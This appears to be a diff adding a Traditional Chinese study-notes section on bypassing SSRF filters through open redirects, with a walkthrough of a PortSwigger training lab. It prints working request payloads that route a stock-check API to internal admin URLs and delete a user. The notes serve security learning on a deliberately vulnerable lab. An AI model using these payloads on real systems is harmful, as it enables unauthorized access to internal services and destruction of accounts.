@@ -171,3 +171,57 @@ URL 規範包含許多在使用這種方法實現臨時解析和驗證 URL 時�
     6. 找到刪除使用者的 API `/admin/delete?username=carlos`
     7. 發送刪除使用者的請求 `http://localhost%2523@stock.weliketoshop.net%2Fadmin%2Fdelete%3Fusername%3Dcarlos` 完成 Lab
 
+### 透過開放重定向繞過 SSRF 過濾器
+
+有時可以透過利用開放重定向漏洞來繞過基於過濾器的防禦機制。
+
+在前面的例子中，假設使用者提交的 URL 經過嚴格驗證，以防止惡意利用 SSRF 行為。然而，被允許的應用程式URL中包含開放重定向漏洞。如果用於發出後端 HTTP 請求的 API 支援重定向，你可以構造一個滿足過濾器要求的 URL，並導致重定向請求到所需的後端目標。
+
+例如，應用程式包含一個開放重定向漏洞，其中以下 URL：
+
+```
+/product/nextProduct?currentProductId=6&path=http://evil-user.net
+```
+
+會返回重定向到：
+
+```
+http://evil-user.net
+```
+
+你可以利用開放重定向漏洞來繞過 URL 過濾器，並如下利用 SSRF 漏洞：
+
+```
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+```
+
+這個 SSRF 攻擊有效的原因是，應用程式首先驗證提供的 `stockAPI` URL 是否在允許的域名上，確實如此。然後應用程式請求提供的 URL，這觸發了開放重定向。它跟隨重定向，並向攻擊者選擇的內部 URL 發出請求。
+
+* **Lab: [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)**
+    1. 進入任意商品頁面，點擊 Check stock 按鈕查看庫存，發現 data 部分會呼叫 API：
+        ```
+        stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+        ```
+
+        使用 URL decode 後是：
+        ```
+        stockApi=/product/stock/check?productId=1&storeId=1
+        ```
+    2. 由於這邊呼叫 API 沒有帶 Host，所以要找找看是否有能夠轉址的 API
+    3. 在點擊 Next product 按鈕後，發現有一個 API 會進行轉址：
+        ```
+        /product/nextProduct?currentProductId=1&path=/product?productId=2
+        ```
+    4. 將以上資訊組合後，即可向題目要求的 URL 發送請求並刪除指定使用者完成此 Lab：
+        ```
+        stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
+        ```
+
+        在回應中找到刪除使用者的 API，接著進行刪除
+        ```
+        stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+        ```
